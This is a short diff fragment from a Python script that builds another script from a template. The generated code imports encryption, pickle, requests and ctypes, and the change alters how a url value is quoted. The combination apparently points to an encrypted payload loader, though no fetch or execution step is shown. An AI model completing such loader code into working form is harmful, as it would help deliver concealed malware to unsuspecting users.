@@ -42,7 +42,7 @@ cccc=f'''
 from cryptography.fernet import Fernet
 import pickle,base64,requests,ctypes
 import random
-url={url}
+url=f'{url}'
 a=[]
 class B():
     def cc(self):
